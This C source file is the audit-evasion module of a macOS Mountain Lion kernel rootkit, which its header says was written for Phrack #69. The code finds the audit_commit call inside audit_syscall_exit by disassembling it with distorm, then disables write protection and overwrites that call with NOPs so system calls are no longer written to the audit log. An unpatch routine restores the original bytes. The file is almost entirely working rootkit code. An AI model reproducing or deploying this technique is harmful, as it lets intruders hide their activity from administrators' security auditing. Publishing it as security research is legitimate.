/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * audit.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "audit.h"

#include <sys/param.h>
#include <sys/malloc.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "my_data_definitions.h"
#include "kernel_info.h"
#include "disasm_utils.h"
#include "distorm.h"
#include "mnemonics.h"

extern struct kernel_info g_kernel_info;
// instead of using global vars we could find the first pattern when NOPing
// and then the NOP pattern when unpatching... this is just a sample :P
char *original_bytes = NULL;
mach_vm_address_t patch_address = 0;
int patch_size = 0;

static kern_return_t find_syscall_commit();

/*
 * *** WARNING ***
 *
 * this example like this creates a huge memory leak inside the kernel
 * the reason is that we patch the commit but never free the record from the queue
 * 
 * the right way to do it is to hook audit_commit() and clean the records we don't want
 * to show up in audit logs
 *
 * *** WARNING ***
 */

#pragma mark Start and stop functions

/*
 * test functions to patch/unpatch the call to audit_commit() in audit_syscall_exit
 * three other calls to audit_commit remain for other types (mach et al) :-)
 */
kern_return_t
patch_audit_commit(void)
{
    if (find_syscall_commit())
    {
#if DEBUG
        //moony_modify//printf("[ERROR] find_syscall_commit failed!\n");
#endif
     return KERN_FAILURE;
    }
    // just NOP the call to audit_commit()
    disable_interrupts();
    disable_wp();
    memset((void*)patch_address, 0x90, patch_size);
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

kern_return_t
unpatch_audit_commit(void)
{
    // restore original bytes
    if (original_bytes == NULL) return KERN_FAILURE;
    disable_interrupts();
    disable_wp();
    memcpy((void*)patch_address, original_bytes, patch_size);
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

#pragma mark Auxiliary functions

/*
 * find the location of audit_commit in audit_syscall_exit()
 */
static kern_return_t
find_syscall_commit(void)
{
    // the function we are going to disassemble to find audit_commit call
    mach_vm_address_t _audit_syscall_exit = solve_kernel_symbol(&g_kernel_info, "_audit_syscall_exit");
    mach_vm_address_t _audit_commit = solve_kernel_symbol(&g_kernel_info, "_audit_commit");
    // let's disassemble and find the call address
#define MAX_INSTRUCTIONS 256 // function has less than 100 disassembled lines
    // allocate space for disassembly output
    _DInst *decodedInstructions = _MALLOC(sizeof(_DInst) * MAX_INSTRUCTIONS, M_TEMP, M_WAITOK);
    if (decodedInstructions == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Decoded instructions allocation failed!\n");
#endif
        return 0;
    }
    
    unsigned int decodedInstructionsCount = 0;
	_DecodeResult res = 0;
    _CodeInfo ci;
    ci.dt = Decode64Bits;
    ci.features = DF_NONE;
    ci.codeLen = 1024; // function is not near this big
    ci.code = (uint8_t*)_audit_syscall_exit;
    ci.codeOffset = _audit_syscall_exit;
    mach_vm_address_t next;
    
    while (1)
    {
        res = distorm_decompose(&ci, decodedInstructions, MAX_INSTRUCTIONS, &decodedInstructionsCount);
        if (res == DECRES_INPUTERR)
        {
            // Error handling...
#if DEBUG
            //moony_modify//printf("[ERROR] Distorm failed to disassemble!\n");
#endif
            goto failure;
        }
        // iterate over the disassembly and lookup for CALL instructions
        for (int i = 0; i < decodedInstructionsCount; i++)
        {
            if (decodedInstructions[i].opcode == I_CALL)
            {
                // retrieve the target address and see if it matches the symbol we are looking for
                mach_vm_address_t rip_address = INSTRUCTION_GET_TARGET(&decodedInstructions[i]);
                if (rip_address == _audit_commit)
                {
                    // return size and location
                    patch_address = decodedInstructions[i].addr;
                    patch_size = decodedInstructions[i].size;
                    // copy original bytes so we can restore them on unload
                    original_bytes = _MALLOC(patch_size, M_TEMP, M_WAITOK);
                    if (original_bytes == NULL) goto failure;
                    memcpy(original_bytes, (void*)patch_address, patch_size);
#if DEBUG
                    //moony_modify//printf("[DEBUG] found _audit_commit at %p size %d\n", (void*)patch_address, patch_size);
#endif
                    goto end;
                }
            }
        }
        
        if (res == DECRES_SUCCESS) break; // All instructions were decoded.
        else if (decodedInstructionsCount == 0) break;
        // sync the disassembly
        // the total number of bytes disassembly to previous last instruction
        next = decodedInstructions[decodedInstructionsCount-1].addr  - ci.codeOffset;
        // add points to the first byte so add instruction size to it
        next += decodedInstructions[decodedInstructionsCount-1].size;
        // update the CodeInfo struct with the synced data
        ci.code += next;
        ci.codeOffset += next;
        ci.codeLen -= next;
    }
    
end:
    _FREE(decodedInstructions, M_TEMP);
    return KERN_SUCCESS;
failure:
    _FREE(decodedInstructions, M_TEMP);
    return KERN_FAILURE;
}

